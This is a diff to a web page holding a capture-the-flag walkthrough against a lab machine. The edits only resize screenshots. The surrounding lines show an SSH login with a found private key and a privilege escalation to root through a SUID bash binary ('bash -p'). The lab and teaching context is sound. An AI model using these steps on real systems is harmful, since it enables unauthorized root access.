@@ -140,7 +140,7 @@ PORT   STATE SERVICE VERSION
 		  <p>
 		    <div class="desc">Read the robots.txt & secret.txt</div><br>
 		 <img src="source/1.PNG" style="width:600px; height: 360px;"><br>
-		 <img src="source/2.PNG" style="width:600px; height: 360px;"> <br>
+		 <img src="source/2.PNG" style="width:600px; height: 500px;"> <br>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[stukas@parrot]─[~]
 └──╼ $curl http://10.0.2.5/robots.txt
 User-Agent: *
@@ -175,10 +175,10 @@ kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
 		   </p>
 		    <p>
 		    <div class="desc">Found the oscp username | SSH Login</div>
-		<img src="source/3.PNG" style="width:500px; height: 50px;"><br><br>
+		<img src="source/3.PNG" style="width:500px; height: 400px;"><br><br>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 700 id_rsa
 ssh -i id_rsa oscp@10.0.2.5</code></pre></div></div>
-		    <img src="source/4.PNG" style="width:600px; height: 100px;"><br>
+		    <img src="source/4.PNG" style="width:400px; height: 400px;"><br>
 		   </p>
 		 <p>
 		    <div class="desc">Find SUID permissions</div>
@@ -186,18 +186,18 @@ ssh -i id_rsa oscp@10.0.2.5</code></pre></div></div>
 ....
 /usr/bin/bash
 ....</code></pre></div></div><br>
-		    <img src="source/5.PNG" style="width:830px; height:454px;"><br>
+		    <img src="source/5.PNG" style="width:450px; height:480px;"><br>
 		  </p>
 		  <p>
 		    <div class="desc">GTFOBins | bash</div>
-		    <img src="source/6.PNG" style="width:450px; height: 320px;"><br><br>
+		    <img src="source/6.PNG" style="width:600px; height: 200px;"><br><br>
 		    <div class="desc">Privesc to Root</div>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ sh -c 'cp $(which bash) .; chmod +s ./bash'
 bash-5.0$ /usr/bin/bash -p
 bash-5.0# bash -p
 bash-5.0# whoami
 root</code></pre></div></div>
-		    <img src="source/7.PNG" style="width:400px; height: 200px;"><br><br>
+		    <img src="source/7.PNG" style="width:1000px; height: 200px;"><br><br>
 		    <div class="desc">Rooted :)</div>
 			</p>	
 		</div> 
